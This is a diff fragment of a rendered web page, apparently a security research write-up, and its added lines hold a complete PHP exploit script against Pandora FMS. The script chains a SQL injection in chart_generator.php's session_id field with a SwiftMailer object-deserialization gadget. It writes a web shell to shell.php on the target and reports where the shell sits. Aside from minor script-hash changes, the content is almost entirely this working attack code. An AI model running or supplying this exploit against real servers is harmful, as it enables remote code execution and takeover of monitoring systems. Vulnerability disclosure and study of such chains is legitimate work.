+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$httpCode</span> <span class="o">===</span> <span class="mi">302</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$status</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt_array</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_POST</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_HTTPHEADER</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_HEADER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_POSTFIELDS</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_RETURNTRANSFER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_PROXY</span> <span class="o">=&gt;</span> <span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="p">,</span> <span class="c1">//proxy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// var_dump($response);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="s2">&#34;Pandora FMS Graph ( - )&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;[+] Inject payload successful!&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;[!]Inject payload failed!&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">exploit</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Create Swift_Transport_SendmailTransport instance and set its properties
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Swift_Transport_SendmailTransport</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Swift_ByteStream_FileByteStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="o">-&gt;</span><span class="na">path</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/pandora_console/shell.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="o">-&gt;</span><span class="na">mode</span> <span class="o">=</span> <span class="s2">&#34;w+b&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">started</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">eventDispatcher</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Swift_Events_SimpleEventDispatcher</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Set session variables
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;alert_msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;new_chat&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Set the payload instance as session data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;vulnClass&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$payload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Encode the session data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$encodedData</span> <span class="o">=</span> <span class="nx">session_encode</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// echo PHP_EOL . PHP_EOL . &#34;Encoded session data: &#34; . $encodedData . PHP_EOL;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Decode the session data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">session_decode</span><span class="p">(</span><span class="nv">$encodedData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// echo &#34;Decoded session data: &#34; . PHP_EOL;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Send request
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="nx">PHP_EOL</span> <span class="o">.</span> <span class="s2">&#34;[+] Send payload...&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$host</span> <span class="o">.</span> <span class="s1">&#39;/pandora_console/include/chart_generator.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;session_id=&#39;</span> <span class="o">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="s1">&#39;xxxxx\&#39; union select \&#39;1\&#39;,0,\&#39;&#39;</span> <span class="o">.</span> <span class="nv">$encodedData</span> <span class="o">.</span> <span class="s1">&#39;\&#39; as data#&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// var_dump($response);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Extract session ID from response headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;[+] Extracting PHPSESSID...&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/PHPSESSID=([^\s;]+)/&#39;</span><span class="p">,</span> <span class="nv">$response</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$sessionId</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;[+] PHPSESSID = &#34;</span> <span class="o">.</span> <span class="nv">$sessionId</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Trigger payload
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="nx">PHP_EOL</span> <span class="o">.</span> <span class="s2">&#34;[+] Triggering payload...&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$host</span> <span class="o">.</span> <span class="s2">&#34;/pandora_console/ws.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$status</span> <span class="o">=</span> <span class="nx">httpGet</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$sessionId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$status</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;[+] Exploit successful. Your shell is located at: &#34;</span> <span class="o">.</span> <span class="nv">$host</span> <span class="o">.</span> <span class="s2">&#34;/pandora_console/shell.php&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Exploit failed.&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Usage: php exploit.php &lt;url&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Running exploit on </span><span class="si">$url\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exploit</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="iv-references">IV References</h2>
 <ul>
@@ -3519,7 +3517,7 @@ bytes we can use a similar technique to cause the session file to be a valid Pha
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.7be2debdadbc35f9430de39f9010d89df5aee1904747098818b5c01cd0672180.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -4178,7 +4176,7 @@ document.addEventListener('DOMContentLoaded', function () {
       e.trigger.classList.add('tooltipped');
       e.trigger.classList.add('tooltipped-s');
     });
-    // =================================================================
+    
 
 
 
